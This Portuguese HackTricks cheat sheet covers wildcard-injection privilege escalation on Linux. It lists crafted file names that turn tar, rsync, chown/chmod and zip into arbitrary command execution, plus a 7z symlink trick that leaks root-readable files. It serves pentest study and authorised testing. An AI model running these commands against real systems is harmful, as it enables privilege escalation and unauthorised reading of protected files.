{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Você pode **indicar qual proprietário de arquivo e permissões você deseja copiar para o restante dos arquivos**
```bash
touch "--reference=/my/own/path/filename"
```
Você pode explorar isso usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque combinado)_\
Mais informações em [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Executar comandos arbitrários:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Você pode explorar isso usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque tar)_\
Mais informações em [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Executar comandos arbitrários:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Você pode explorar isso usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Mais informações em [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

No **7z**, mesmo usando `--` antes de `*` (note que `--` significa que a entrada seguinte não pode ser tratada como parâmetros, então apenas caminhos de arquivo neste caso), você pode causar um erro arbitrário para ler um arquivo, então se um comando como o seguinte estiver sendo executado pelo root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
E você pode criar arquivos na pasta onde isso está sendo executado, você poderia criar o arquivo `@root.txt` e o arquivo `root.txt` sendo um **symlink** para o arquivo que você deseja ler:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Então, quando **7z** é executado, ele tratará `root.txt` como um arquivo contendo a lista de arquivos que deve comprimir (é isso que a existência de `@root.txt` indica) e quando o 7z ler `root.txt`, ele lerá `/file/you/want/to/read` e **como o conteúdo deste arquivo não é uma lista de arquivos, ele gerará um erro** mostrando o conteúdo.

_Mais informações em Write-ups da caixa CTF do HackTheBox._

## Zip

**Executar comandos arbitrários:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
